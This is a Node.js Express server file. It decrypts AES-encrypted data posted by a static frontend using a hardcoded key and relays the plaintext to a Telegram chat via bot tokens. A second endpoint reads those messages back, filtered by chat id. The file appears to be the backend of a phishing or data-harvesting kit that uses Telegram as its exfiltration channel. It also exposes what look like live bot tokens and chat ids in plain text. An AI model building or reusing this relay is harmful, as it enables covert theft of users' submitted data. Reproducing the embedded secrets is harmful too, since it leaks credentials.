const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const port = 8080;
const CryptoJS = require("crypto-js");

require("dotenv").config();

const SECRET_KEY = "key";
const TELEGRAM_BOT_TOKEN = "6894974714:AAEbOAZb0Oz1q8uXvMD6FqIAX1oTAZaZU7g";
const TELEGRAM_BOT_TOKEN_2 = "6939916007:AAF5h7hwD2-E8YVWXSO9SWii20-wAQIovVQ";
const TELEGRAM_CHAT_ID = "-1002209368311";

app.use(bodyParser.json());
app.use(express.static("public"));

app.post("/storeData", async (req, res) => {
  try {
    const encryptedData = req.body.data;

    // Decrypt data
    const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
    const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));

    // Construct message for Telegram
    const message = JSON.stringify(decryptedData);

    // Send message to Telegram
    const telegramApiUrl2 = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`;
    const respons = await fetch(telegramApiUrl2, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!respons.ok) {
      throw new Error("Failed to send message to Telegram");
    }

    // res.status(200).send(`Data stored with ID: ${id}`);
  } catch (error) {
    console.error("Error storing data:", error);
    res.status(500).send("Failed to store data");
  }
});
app.get("/fetchData", async (req, res) => {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
  try {
    const fetch = await import("node-fetch");
    const response = await fetch.default(telegramApiUrl, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });

    if (!response.ok) {
      throw new Error("Failed to fetch data from Telegram");
    }

    const data = await response.json();

    const messages = data.result
      .filter(
        (update) =>
          (update.channel_post && update.channel_post.text) ||
          (update.edited_channel_post && update.edited_channel_post.text)
      )
      .map((update) => {
        if (update.channel_post) {
          return update.channel_post.text;
        } else if (update.edited_channel_post) {
          return update.edited_channel_post.text;
        }
      })
      .filter((text) => {
        try {
          JSON.parse(text);
          return true;
        } catch (e) {
          return false;
        }
      });

    const entries = messages.reduce((acc, message) => {
      const data = JSON.parse(message);
      data.forEach((item) => {
        if (!acc[item.id]) {
          acc[item.id] = {};
        }
        acc[item.id][item.type] = item.value;
      });
      return acc;
    }, {});

    console.log("Processed entries:", entries);
    const filteredEntries = Object.entries(entries).reduce(
      (acc, [id, entry]) => {
        if (entry.chatid === "-1002236584741") {
          acc[id] = entry;
        }
        return acc;
      },
      {}
    );

    console.log("Filtered entries:", filteredEntries);
    res.status(200).json(filteredEntries);
  } catch (error) {
    console.error("Error fetching data from Telegram:", error);
    res.status(500).send("Failed to fetch data from Telegram");
  }
});

app.listen(port, () => {
  console.log(`Backend server running at http://localhost:${port}`);
});
